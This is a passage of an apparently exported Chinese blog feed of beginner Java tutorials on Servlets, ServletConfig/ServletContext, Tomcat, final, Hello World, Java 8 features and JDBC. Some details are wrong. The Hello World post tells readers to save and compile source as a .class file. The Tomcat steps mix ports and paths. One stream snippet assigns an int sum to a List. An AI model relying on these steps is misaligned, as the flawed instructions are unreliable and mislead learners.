(\u0026#34;GET\u0026#34;.equals(method)) { System.out.println(\u0026#34;客户端以 GET 方法访问\u0026#34;); } else if (\u0026#34;POST\u0026#34;.equals(method)) { System.out.println(\u0026#34;客户端以 POST 方式访问\u0026#34;); } } 分别使用 GET 方法和 POST 方法访问地址，可以发现 Servlet 程序可以对不同方法分别进行处理。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java-web%E5%AD%A6%E4%B9%A0servlet-%E5%85%A5%E9%97%A8/","title":"Java Web学习：Servlet 入门"},{"content":"Java Web学习：ServletConfig 类 一、简介 当 servlet 程序配置了初始化参数后，web 容器在创建 servlet 实例对象时，会自动将这些初始化参数封装到 ServletConfig 对象中。在调用 servlet 程序的 init 方法时，我们可以获取到 ServletConfig 对象，此时就可以得到当前 servlet 的初始化参数信息。\n二、配置 servlet 初始参数 servlet 程序的初始参数在 web.xml 文件中，使用 init-param 标签进行配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;!--给 Tomcat 配置 Servlet 程序--\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;!--给 Servlet 程序起别名(一般是类名)--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;!--Servlet 程序的全类名--\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.servelet.HelloServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;!-- 参数名 --\u0026gt; \u0026lt;param-name\u0026gt;username\u0026lt;/param-name\u0026gt; \u0026lt;!-- 参数值 --\u0026gt; \u0026lt;param-value\u0026gt;root\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;password\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;123456\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;!--给 Servlet 程序配置访问地址--\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;!-- 告诉 Tomcat 当前配置地址给哪个 Servlet 程序使用--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- 配置的访问地址 --\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 三、获取初始参数值 ServletConfig 实例主要有三大功能：\n获取 servlet 程序别名； 获取 servlet 的初始化参数； 获取 ServletContext 上下文对象。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @Override public void init(ServletConfig servletConfig) throws ServletException { System.out.println(\u0026#34;init 程序被执行\u0026#34;); // 1. 获取 servlet 程序的别名 System.out.println(servletConfig.getServletName()); // 2. 获取 init-param 的参数 // 获取所有参数名 System.out.println(\u0026#34;所有参数名: \u0026#34; + servletConfig.getInitParameterNames()); // 获取指定参数的参数值 System.out.println(\u0026#34;username: \u0026#34; + servletConfig.getInitParameter(\u0026#34;username\u0026#34;)); // 3. 获取 ServletContext System.out.println(servletConfig.getServletContext()); } Output：\ninit 程序被执行 HelloServlet 所有参数名: java.util.Collections$3@6c07a310 username: root org.apache.catalina.core.ApplicationContextFacade@62c040e0 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java-web%E5%AD%A6%E4%B9%A0servletconfig-%E7%B1%BB/","title":"Java Web学习：ServletConfig 类"},{"content":"Java Web 学习：ServletContext 类 一、简介 ServletContext 是一个接口，它代表的是一个 web 应用的环境（上下文）对象，ServletContext对象内部封装是该 web 应用的信息，一个web应用只有一个 ServletContext 对象。\nServletContext 对象是一个域对象。域对象是指可以像 Map 一样存取数据的对象，这里的“域”指的是存储数据的操作范围。\nServletContext 与 Map 的比较：\n对象 存储数据 取出数据 删除数据 Map put() get() remove() ServletContext setAttribute() getAttribute() removeAttribute() 二、ServletContext 四大功能 ServletContext 的四大功能分别是：\n获取 web.xml 中配置的上下文参数 context-param； 获取当前 web 工程的工程路径； 获取工程部署后的服务器磁盘路径； 像 Map 一样存取数据。 首先在 web.xml 中配置 context-param：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;!-- 参数名 --\u0026gt; \u0026lt;param-name\u0026gt;username\u0026lt;/param-name\u0026gt; \u0026lt;!-- 参数值 --\u0026gt; \u0026lt;param-value\u0026gt;root\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;!--给 Tomcat 配置 Servlet 程序--\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;!--给 Servlet 程序起别名(一般是类名)--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;!--Servlet 程序的全类名--\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.servelet.HelloServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;!--给 Servlet 程序配置访问地址--\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;!-- 告诉 Tomcat 当前配置地址给哪个 Servlet 程序使用--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- 配置的访问地址 --\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 接下来就可以验证 ServletContext 的功能了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public void init(ServletConfig servletConfig) throws ServletException { // 获取 ServletContext 对象 ServletContext context = servletConfig.getServletContext(); // 1. 获取 web.xml 中配置的上下文参数 System.out.println(\u0026#34;context-param 中配置的 username：\u0026#34; + context.getInitParameter(\u0026#34;username\u0026#34;)); // 2. 获取当前工程的工程路径 System.out.println(\u0026#34;当前工程的工程路径：\u0026#34; + context.getContextPath()); // 3. 获取工程部署后在服务器磁盘上的绝对路径 System.out.println(\u0026#34;工程部署后在服务器磁盘上的绝对路径：\u0026#34; + context.getRealPath(\u0026#34;/\u0026#34;)); // 4. 存取值 context.setAttribute(\u0026#34;password\u0026#34;, \u0026#34;123456\u0026#34;); // 存值 System.out.println(\u0026#34;password：\u0026#34; + context.getAttribute(\u0026#34;password\u0026#34;)); // 取值 } 注意：由于整个 Web 工程只有一个 ServletContext 对象，那么在部署的多个应用中获取的 web.xml 中配置的上下文参数都是一样的；并且只要任意一个应用在 ServletContext 对象中存值了，其他的应用也是可以获取到的。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java-web%E5%AD%A6%E4%B9%A0servletcontext-%E7%B1%BB/","title":"Java Web学习：ServletContext 类"},{"content":"Java Web学习——Tomcat 一、简介 Tomcat是一款Apache下面的开源的Servlet容器，实现了对Servlet和JSP规范的支持。另外 Tomcat 本身内含了一个 HTTP 服务器，所以也可以被当作一个 Web 服务器来使用。但是Tomcat作为一个Web服务器，它对静态资源的处理能力要比Apache或者Nginx这类的Web服务器差很多，所以我们经常将Apache和Tomcat（或者是Nginx和Tomcat）组合使用，Apache来充当Web服务器处理静态资源的请求，Tomcat充当Servlet容器来处理动态请求。\n官网：Apache Tomcat® - Welcome!\n二、安装与启动 官网下载链接：Apache Tomcat® - Apache Tomcat 8 Software Downloads\nPS：启动 Tomcat 服务器首先要配置和 JAVA_HOME 环境变量！\n从官网上下载好 Tomcat 的软件包后，打开 bi 目录，点击 startup.bat 文件即可启动 Tomcat 服务器。\n打开浏览器，输入以下任一地址：\nhttp://127.0.0.1:8000/ http://localhost:8080/ http://本机ip:8080/ 出现如下界面则代表 Tomcat 启动成功！ 三、目录介绍 Tomcat 安装包下有多个目录，每个目录都有不同作用，下面对各个目录进行一个简单介绍：\nbin：专门用来存放 Tomcat 服务器的可执行文件；\nconf：存放 Tomcat 的配置文件；\nlib：存放 Tomcat 的 jar 包；\nlogs：存放 Tomcat 的运行日志；\ntemp：存放 Tomcat 运行时产生的临时数据；\nwebapps：存放部署的 Web 工程；\nwork：Tomcat 的工作空间，用来存放 Tomcat 运行时 jsp 翻译为 Servelet 的源码和 Session 钝化的目录。\n四、Tomcat 常用操作 1. 启动 法1：点击 bin 目录里的 startup.bat 文件进行启动；\n法2：打开终端，切换目录到 bin 目录下，输入命令：catalina run\n2. 停止 法1：直接关闭 Tomcat 运行的窗口；\n法2：打开Tomcat 的运行窗口，按下 Ctrl+C 终止运行；\n法3：点击 bin 目录里的 shutdown.bat 文件进行启动；\n3. 修改默认端口号 打开 conf 文件夹下的 server.xml 文件，找到如下内容：\n1 2 3 \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 修改 8080 为其他端口号，并重启 Tomcat 即可修改成功修改端口号。\n4. 部署 Web 应用 方式一：\n在 webapps 目录下新建文件夹 mydemo ，创建一个 index.html 文件，输入如下内容：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, World!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 启动 Tomcat，打开浏览器输入地址：http://127.0.0.1:8080/demo/index.html，即可出现如下景象： 方式二：\n首先将在方式一新建的文件夹放到任意位置。\n进入到 Tomcat 安装目录下的 conf\\Catalina\\localhost 文件夹，新建文件 abc.xml，输入以下内容：\n1 \u0026lt;Context path=\u0026#34;/demo\u0026#34; docBase=\u0026#34;移动的文件夹绝对路径\u0026#34;/\u0026gt; 重启 Tomcat，打开浏览器输入地址：http://127.0.0.1:8080/abc/index.html，即可出现如下景象：\nTomcat 默认访问的页面是 webapps 下的 ROOT 文件夹！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java-web%E5%AD%A6%E4%B9%A0tomcat/","title":"Java Web学习：Tomcat"},{"content":"Java学习之路——final 关键字的使用 概述 在Java中，final关键字可以用来修饰类、方法和变量（包括成员变量和局部变量）。\nfinal 代表着最终的，在 Java程序中加了 final 的类、方法和变量就有着无法修改的意思。\n一、final 修饰类 当用 final 修饰一个类时，表明这个类不能被继承。\n也就是说，我们希望一个类不能被继承，就可以用 final 进行修饰，在 Java 中的 String、System等类就是 final 修饰的类。\nfinal类中的成员变量可以根据需要设为 final，但是要注意 final 类中的所有成员方法都会被隐式地指定为 final 方法。\n1 2 3 final class Person { } 二、final 修饰方法 使用 final 方法的原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的 Java 实现版本中，会将 final 方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的 Java 版本中，不需要使用 final 方法进行这些优化了。 ——《Java编程思想》\n被 final 修饰的方法不能够被子类所重写。 比如在 Object 中，getClass() 方法就是 final 的，我们就不能重写该方法， 但是 hashCode() 方法就不是被 final 所修饰的，我们就可以重写 hashCode() 方法。\n1 2 3 4 5 class Person { final public void say() { System.out.println(\u0026#34;Hello, world!\u0026#34;); } } 三、final 修饰变量 final 修饰的变量，如果是基本数据类型，那么它的值不能修改；如果是引用对象类型，那么它的引用地址是不能修改的。\n注意事项：\nfinal 修饰的属性，其属性赋值位置可以有显示初始化、代码块中初始化、构造器中初始化，不能在方法中赋值； final 修饰的形参变量，在方法中只能使用不能修改； 可以使用 static final 来修饰类全局常量。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Demo { public static void main(String[] args) { final Person p = new Person(); p.age = 15; System.out.println(p.age); final int age = 18; // Cannot assign a value to final variable \u0026#39;age\u0026#39; // age = 15; } } class Person { int age = 18; } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFfinal-%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Java学习之路——final 关键字的使用"},{"content":"入门，从实现 Hello World! 开始 万丈高楼从地起！\n学习任何一门编程语言都是从实现一句 \u0026ldquo;Hello World!\u0026rdquo; 开始。我的 Java 学习之路同样是从这里开始\u0026hellip;\u0026hellip;\n一、Hello World 程序 首先，新建一个 .class 后缀的文件，然后在里面输入下面的代码：\n1 2 3 4 5 public class HelloWorld { public static void main(String[] args) { System.out.println(\u0026#34;Hello World!\u0026#34;); } } 打开命令行窗口，进入到包含 HelloWorld.class 文件的文件夹路径下，依次运行下面的命令：\n1 2 3 \u0026gt; javac HelloWorld.class \u0026gt; java HelloWorld Hello World! 最终就会看到最后 Hello World! 的输出。这就标明我们已经成功实现了第一个 Java 程序！我们已经成功踏入了 Java 语言的事件！\n二、程序分析 下面我们来对这个程序做一个简单的分析：\n第一行：\npublic 表示公开的\nclass 表示这是一个类\nHelloWorld 表示这个类的名字叫做 HelloWorld\n第一行表示定义一个公开的类，这个类的名字叫做 HelloWorld\n第二行：\npublic 表示公开的\nstatic 表示静态的\nvoid 表示函数返回值的类型，void 代表着函数返回值为空，即不返回任何值\nmain 代表着函数的名称\n(String[] args) 括号中代表着该函数接收的形参，传入的参数类型为字符串数组，形参名为 args\n第二行表示定义一个公开的、静态的主方法，该方法名称为 main，返回值为空。\n第三行：\n代表向控制台输出，输出的东西为：Hello World!\n重点归纳： 一个 xxx.java 文件中只能有一个 public class，并且该类的名字必须和文件名相同！ \u0026ldquo;public static void main\u0026rdquo; 是 Java程序的入口方法。在执行 Java 程序时，虚拟机首先就会寻找这个函数。因此这部分是不可变的 \u0026ldquo;System.out.println(\u0026ldquo;Hello World!\u0026rdquo;);\u0026rdquo; 代表着一句 Java语句。在 Java程序中，每一句语句后面都必须以半角分号 \u0026quot;;\u0026quot; 或者 \u0026quot;{}\u0026quot; 结尾。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFhelloworld/","title":"Java学习之路——HelloWorld"},{"content":"Java学习之路——Java8 新特性 概述 虽说 JDK 每个新版本相较于上一个版本都有一些新特性，但是因为 JDK8 是行业中使用最为广泛的版本，因此它的新特性是我们需要了解并使用的。这些新特性能够帮助我们更好的进行编程。\n一、Lambda 表达式 Lambda 表达式，也可称为闭包，它允许把函数作为一个方法的参数（函数作为参数传递进方法中），能够使代码变的更加简洁紧凑。\n语法 1 2 3 (parameters) -\u0026gt; expression // 或 (parameters) -\u0026gt;{ statements; } 特点 以下是lambda表达式的重要特征:\n**可选类型声明：**不需要声明参数类型，编译器可以统一识别参数值； **可选的参数圆括号：**一个参数无需定义圆括号，但多个参数需要定义圆括号； **可选的大括号：**如果主体包含了一个语句，就不需要使用大括号； **可选的返回关键字：**如果主体只有一个表达式返回值则编译器会自动返回值，大括号需要指定明表达式返回了一个数值； 变量作用域：lambda 表达式只能引用标记了 final 的外层局部变量，这就是说不能在 lambda 内部修改定义在域外的局部变量，否则会编译错误；lambda 表达式的局部变量可以不用声明为 final，但是必须不可被后面的代码修改（即隐性的具有 final 的语义）。 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 public class Demo { public static void main(String[] args) throws Exception { Demo tester = new Demo(); // 类型声明 MathOperation addition = (int a, int b) -\u0026gt; a + b; // 不用类型声明 MathOperation subtraction = (a, b) -\u0026gt; a - b; // 大括号中的返回语句 MathOperation multiplication = (int a, int b) -\u0026gt; { return a * b; }; // 没有大括号及返回语句 MathOperation division = (int a, int b) -\u0026gt; a / b; System.out.println(\u0026#34;10 + 5 = \u0026#34; + tester.operate(10, 5, addition)); System.out.println(\u0026#34;10 - 5 = \u0026#34; + tester.operate(10, 5, subtraction)); System.out.println(\u0026#34;10 x 5 = \u0026#34; + tester.operate(10, 5, multiplication)); System.out.println(\u0026#34;10 / 5 = \u0026#34; + tester.operate(10, 5, division)); // 不用括号 GreetingService greetService1 = message -\u0026gt; System.out.println(\u0026#34;Hello \u0026#34; + message); // 用括号 GreetingService greetService2 = (message) -\u0026gt; System.out.println(\u0026#34;Hello \u0026#34; + message); greetService1.sayMessage(\u0026#34;Runoob\u0026#34;); greetService2.sayMessage(\u0026#34;Google\u0026#34;); } interface MathOperation { int operation(int a, int b); } interface GreetingService { void sayMessage(String message); } private int operate(int a, int b, MathOperation mathOperation){ return mathOperation.operation(a, b); } } 二、方法引用 有时候我们的 Lambda 表达式可能仅仅调用一个已存在的方法，而不做任何其它事。\n对于这种情况，通过一个方法名字来引用这个已存在的方法会更加清晰，Java 8的方法引用允许我们这样做。方法引用是一个更加紧凑，易读的 Lambda 表达式。\n方法引用是一个Lambda表达式，其中方法引用的操作符是双冒号 ::。\n方法引用主要有以下几种方式：\n**构造器引用：**语法为 Class :: new或Class\u0026lt;T\u0026gt; :: new； **静态方法引用：**语法为 Class :: static_method； **特定类的任意对象的方法引用：**语法为 Class :: method； **特定对象的方法引用：**语法为 instance :: method。 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import java.util.ArrayList; import java.util.List; public class Demo { public static void main(String[] args) throws Exception { List\u0026lt;String\u0026gt; names = new ArrayList(); names.add(\u0026#34;Google\u0026#34;); names.add(\u0026#34;Runoob\u0026#34;); names.add(\u0026#34;Taobao\u0026#34;); names.add(\u0026#34;Baidu\u0026#34;); names.add(\u0026#34;Sina\u0026#34;); names.forEach(System.out::println); } } 三、函数式接口 函数式接口(Functional Interface)就是一个有且仅有一个抽象方法，但是可以有多个非抽象方法的接口。\n当一个接口符合函数式接口定义（有且只有一个抽象方法），那么就可以通过 lambda 表达式、方法引用的方式来创建，无论该接口有没有加上 @FunctionalInterface 注解。即 lambda表达式就是函数式接口的实现！\n示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Demo { public static void main(String[] args) { printString(\u0026#34;函数式编程\u0026#34;, System.out::println); } private static void printString(String text, MyFunction myFunction) { myFunction.print(text); } } @FunctionalInterface interface MyFunction { void print(String s); } java.util.function 包 在 java.util.function 包下，定义了大量的函数式接口，每个接口都有且只有一个抽象方法，这些接口的区别在于其中的抽象方法的参数和返回值不同。\n类型 参数个数 参数类型 返回值类型 Function\u0026lt;T,R\u0026gt; 1 T R IntFunction\u0026lt;R\u0026gt; 1 int R LongFunction\u0026lt;R\u0026gt; 1 long R DoubleFunction\u0026lt;R\u0026gt; 1 double R ToIntFunction\u0026lt;T\u0026gt; 1 T int ToLongFunction\u0026lt;T\u0026gt; 1 T long ToDoubleFunction\u0026lt;T\u0026gt; 1 T double IntToLongFunction 1 int long IntToDoubleFunction 1 int double LongToIntFunction 1 long int LongToDoubleFunction 1 long double DoubleToIntFunction 1 double int DoubleToLongFunction 1 double long BiFunction\u0026lt;T,U,R\u0026gt; 2 T,U R ToIntBiFunction\u0026lt;T,U\u0026gt; 2 T,U int ToLongBiFunction\u0026lt;T,U\u0026gt; 2 T,U long ToDoubleBiFunction\u0026lt;T,U\u0026gt; 2 T,U double UnaryOperator\u0026lt;T\u0026gt; 1 T T IntUnaryOperator 1 int int LongUnaryOperator 1 long long DoubleUnaryOperator 1 double double BinaryOperator\u0026lt;T\u0026gt; 2 T,T T IntBinaryOperator 2 int,int int LongBinaryOperator 2 long,long long DoubleBinaryOperator 2 double,double double Consumer\u0026lt;T\u0026gt; 1 T void IntConsumer 1 int void LongConsumer 1 long void DoubleConsumer 1 double void BiConsumer\u0026lt;T,U\u0026gt; 2 T,U void ObjIntConsumer\u0026lt;T\u0026gt; 2 T,int void ObjLongConsumer\u0026lt;T\u0026gt; 2 T,long void ObjDoubleConsumer\u0026lt;T\u0026gt; 2 T,double void Supplier\u0026lt;T\u0026gt; 0 - T BooleanSupplier 0 - boolean IntSupplier 0 - int LongSupplier 0 - long DoubleSupplier 0 - double Predicate\u0026lt;T\u0026gt; 1 T boolean IntPredicate 1 int boolean LongPredicate 1 long boolean DoublePredicate 1 double boolean BiPredicate\u0026lt;T,U\u0026gt; 2 T,U boolean 四、Stream Stream 使用一种类似用 SQL 语句从数据库查询数据的直观方式来提供一种对 Java 集合运算和表达的高阶抽象。\nStream API可以极大提高Java程序员的生产力，让程序员写出高效率、干净、简洁的代码。\n这种风格将要处理的元素集合看作一种流， 流在管道中传输， 并且可以在管道的节点上进行处理， 比如筛选， 排序，聚合等。\n元素流在管道中经过中间操作（intermediate operation）的处理，最后由最终操作(terminal operation)得到前面处理的结果。\n+--------------------+ +------+ +------+ +---+ +-------+ | stream of elements +-----\u0026gt; |filter+-\u0026gt; |sorted+-\u0026gt; |map+-\u0026gt; |collect| +--------------------+ +------+ +------+ +---+ +-------+ 以上的流程转换为 Java 代码为：\n1 2 3 4 5 6 List\u0026lt;Integer\u0026gt; transactionsIds = widgets.stream() .filter(b -\u0026gt; b.getColor() == RED) .sorted((x,y) -\u0026gt; x.getWeight() - y.getWeight()) .mapToInt(Widget::getWeight) .sum(); 生成流 在 Java 8 中, 集合接口有两个方法来生成流：\nstream() − 为集合创建串行流。 parallelStream() − 为集合创建并行流。 1 2 List\u0026lt;String\u0026gt; strings = Arrays.asList(\u0026#34;abc\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;bc\u0026#34;, \u0026#34;efg\u0026#34;, \u0026#34;abcd\u0026#34;,\u0026#34;\u0026#34;, \u0026#34;jkl\u0026#34;); List\u0026lt;String\u0026gt; filtered = strings.stream().filter(string -\u0026gt; !string.isEmpty()).collect(Collectors.toList()); forEach Stream 提供了新的方法 forEach来迭代流中的每个数据。以下代码片段使用forEach 输出了10个随机数：\n1 2 Random random = new Random(); random.ints().limit(10).forEach(System.out::println); map map 方法用于映射每个元素到对应的结果，以下代码片段使用 map 输出了元素对应的平方数：\n1 2 3 List\u0026lt;Integer\u0026gt; numbers = Arrays.asList(3, 2, 2, 3, 7, 3, 5); // 获取对应的平方数 List\u0026lt;Integer\u0026gt; squaresList = numbers.stream().map( i -\u0026gt; i*i).distinct().collect(Collectors.toList()); filter filter 方法用于通过设置的条件过滤出元素。以下代码片段使用 filter 方法过滤出空字符串：\n1 2 3 List\u0026lt;String\u0026gt;strings = Arrays.asList(\u0026#34;abc\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;bc\u0026#34;, \u0026#34;efg\u0026#34;, \u0026#34;abcd\u0026#34;,\u0026#34;\u0026#34;, \u0026#34;jkl\u0026#34;); // 获取空字符串的数量 long count = strings.stream().filter(string -\u0026gt; string.isEmpty()).count(); limit limit 方法用于获取指定数量的流。 以下代码片段使用 limit 方法打印出 10 条数据：\n1 2 Random random = new Random(); random.ints().limit(10).forEach(System.out::println); sorted sorted 方法用于对流进行排序。以下代码片段使用 sorted 方法对输出的 10 个随机数进行排序：\n1 2 Random random = new Random(); random.ints().limit(10).sorted().forEach(System.out::println); 并行（parallel）程序 parallelStream 是流并行处理程序的代替方法。以下实例我们使用 parallelStream 来输出空字符串的数量：\n1 2 3 List\u0026lt;String\u0026gt; strings = Arrays.asList(\u0026#34;abc\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;bc\u0026#34;, \u0026#34;efg\u0026#34;, \u0026#34;abcd\u0026#34;,\u0026#34;\u0026#34;, \u0026#34;jkl\u0026#34;); // 获取空字符串的数量 long count = strings.parallelStream().filter(string -\u0026gt; string.isEmpty()).count(); Collectors Collectors 类实现了很多归约操作，例如将流转换成集合和聚合元素。Collectors 可用于返回列表或字符串：\n1 2 3 4 5 6 List\u0026lt;String\u0026gt;strings = Arrays.asList(\u0026#34;abc\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;bc\u0026#34;, \u0026#34;efg\u0026#34;, \u0026#34;abcd\u0026#34;,\u0026#34;\u0026#34;, \u0026#34;jkl\u0026#34;); List\u0026lt;String\u0026gt; filtered = strings.stream().filter(string -\u0026gt; !string.isEmpty()).collect(Collectors.toList()); System.out.println(\u0026#34;筛选列表: \u0026#34; + filtered); String mergedString = strings.stream().filter(string -\u0026gt; !string.isEmpty()).collect(Collectors.joining(\u0026#34;, \u0026#34;)); System.out.println(\u0026#34;合并字符串: \u0026#34; + mergedString); 统计 另外，一些产生统计结果的收集器也非常有用。它们主要用于int、double、long等基本类型上，它们可以用来产生类似如下的统计结果。\n1 2 3 4 5 6 7 8 List\u0026lt;Integer\u0026gt; numbers = Arrays.asList(3, 2, 2, 3, 7, 3, 5); IntSummaryStatistics stats = numbers.stream().mapToInt((x) -\u0026gt; x).summaryStatistics(); System.out.println(\u0026#34;列表中最大的数 : \u0026#34; + stats.getMax()); System.out.println(\u0026#34;列表中最小的数 : \u0026#34; + stats.getMin()); System.out.println(\u0026#34;所有数之和 : \u0026#34; + stats.getSum()); System.out.println(\u0026#34;平均数 : \u0026#34; + stats.getAverage()); 五、Optional 类 Optional 类是一个可以为null的容器对象。如果值存在则isPresent()方法会返回true，调用get()方法会返回该对象；\nOptional 是个容器：它可以保存类型T的值，或者仅仅保存null。Optional提供很多有用的方法，这样我们就不用显式进行空值检测；\nOptional 类的引入很好的解决空指针异常。\n常用方法：\n方法 功能描述 static \u0026lt;T\u0026gt; Optional\u0026lt;T\u0026gt; empty() 返回空的 Optional 实例； equals(Object obj) 判断其他对象是否等于 Optional； Optional\u0026lt;T\u0026gt; filter(Predicate\u0026lt;? super \u0026lt;T\u0026gt; predicate) 如果值存在，并且这个值匹配给定的 predicate，返回一个Optional用以描述这个值，否则返回一个空的Optional； \u0026lt;U\u0026gt; Optional\u0026lt;U\u0026gt; flatMap(Function\u0026lt;? super T,Optional\u0026lt;U\u0026gt;\u0026gt; mapper) 如果值存在，返回基于Optional包含的映射方法的值，否则返回一个空的Optional； T get() 如果在这个Optional中包含这个值，返回值，否则抛出异常NoSuchElementException； hashCode() 返回存在值的哈希码，如果值不存在 返回 0； ifPresent(Consumer\u0026lt;? super T\u0026gt; consumer) 如果值存在则使用该值调用 consumer , 否则不做任何事情； isPresent() 如果值存在则方法会返回true，否则返回 false； \u0026lt;U\u0026gt;Optional\u0026lt;U\u0026gt; map(Function\u0026lt;? super T,? extends U\u0026gt; mapper) 如果有值，则对其执行调用映射函数得到返回值。如果返回值不为 null，则创建包含映射返回值的Optional作为map方法返回值，否则返回空Optional； \u0026lt;T\u0026gt; Optional\u0026lt;T\u0026gt; of(T value) 返回一个指定非null值的Optional； \u0026lt;T\u0026gt; Optional\u0026lt;T\u0026gt; ofNullable(T value) 如果为非空，返回 Optional 描述的指定值，否则返回空的 Optional； T orElse(T other) 如果存在该值，返回值， 否则返回 other； T orElseGet(Supplier\u0026lt;? extends T\u0026gt; other) 如果存在该值，返回值， 否则触发 other，并返回 other 调用的结果； \u0026lt;X extends Throwable\u0026gt; T orElseThrow(Supplier\u0026lt;? extends X\u0026gt; exceptionSupplier) 如果存在该值，返回包含的值，否则抛出由 Supplier 继承的异常； String toString() 返回一个Optional的非空字符串，用来调试。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFjava8-%E6%96%B0%E7%89%B9%E6%80%A7/","title":"Java学习之路——Java8 新特性"},{"content":"Java学习之路——JDBC 概述 持久化(persistence)：把数据保存到可掉电式存储设备中以供之后使用。大多数情况下，特别是企业级应用，数据持久化意味着将内存中的数据保存到硬盘上加以”固化”，而持久化会将内存中的数据存储在关系型数据库中，或者存储在磁盘文件、XML数据文件中。\n而我们将要学习的 JDBC 就是为了实现在 Java 程序中的数据持久化而诞生的。\n一、JDBC 基础知识 1. Java中的数据存储技术 在Java中，数据库存取技术可分为如下几类：\nJDBC(Java Database Connectivity)：是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法；\nJDO (Java Data Object )技术：Java 对象持久化的规范，也是一个用于存取某种数据仓库中的对象的标准化API；\n第三方O/R工具：如 Hibernate, Mybatis 等。\nJDBC 是 Java 程序访问数据库的基石，JDO、Hibernate、MyBatis 等只是更好的封装了 JDBC。\n2. JDBC 